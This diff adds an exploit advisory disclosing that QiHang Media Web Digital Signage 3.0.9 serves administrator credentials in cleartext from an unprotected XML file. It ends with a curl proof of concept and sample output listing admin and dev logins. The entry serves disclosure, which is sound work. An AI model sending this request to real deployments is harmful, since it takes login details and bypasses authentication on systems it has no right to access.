@@ -1,0 +1,48 @@
+# Exploit Title: QiHang Media Web Digital Signage 3.0.9 - Cleartext Credential Disclosure
+# Date: 2020-08-12
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.howfor.com
+# Tested on: Microsoft Windows Server 2012 R2 Datacenter
+# CVE : N/A
+
+QiHang Media Web (QH.aspx) Digital Signage 3.0.9 Cleartext Credentials Disclosure
+
+
+Vendor: Shenzhen Xingmeng Qihang Media Co., Ltd.
+        Guangzhou Hefeng Automation Technology Co., Ltd.
+Product web page: http://www.howfor.com
+Affected version: 3.0.9.0
+
+Summary: Digital Signage Software.
+
+Desc: The application suffers from clear-text credentials disclosure vulnerability
+that allows an unauthenticated attacker to issue a request to an unprotected directory
+that hosts an XML file '/xml/User/User.xml' and obtain administrative login information
+that allows for a successful authentication bypass attack.
+
+Tested on: Microsoft Windows Server 2012 R2 Datacenter
+           Microsoft Windows Server 2003 Enterprise Edition
+           ASP.NET 4.0.30319
+           HowFor Web Server/5.6.0.0
+           Microsoft ASP.NET Web QiHang IIS Server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5579
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
+
+
+27.07.2020
+
+--
+
+$ curl http://192.168.1.1/xml/User/User.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<Users>
+  <User id="1" account="admin" password="admin" />
+  <User id="2" account="dev" password="dev" />
+</Users>
